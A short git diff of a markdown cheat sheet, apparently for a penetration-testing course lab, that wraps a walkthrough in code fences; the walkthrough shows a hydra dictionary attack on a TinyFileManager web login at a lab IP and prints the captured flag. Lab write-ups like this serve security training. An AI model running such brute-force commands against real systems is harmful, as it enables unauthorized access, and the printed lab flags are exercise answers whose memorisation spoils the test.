@@ -28,6 +28,7 @@ Successful Login
 >![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-4.png)
 
 Lab 1 - Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.
+>``` shell
 ># Perform dictionary attack against web login
 >kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.243.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 >
@@ -45,6 +46,7 @@ Lab 1 - Follow the steps from this section to gain access to TinyFileManager on 
 >Hola! Here is the secret API key - Don't share it
 >OS{d3469592b23444bcb26a671ea9d3a65d}
 ># ====================================
+>```
 >OS{d3469592b23444bcb26a671ea9d3a65d}
 
 Lab 2 - The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as the answer to this exercise.
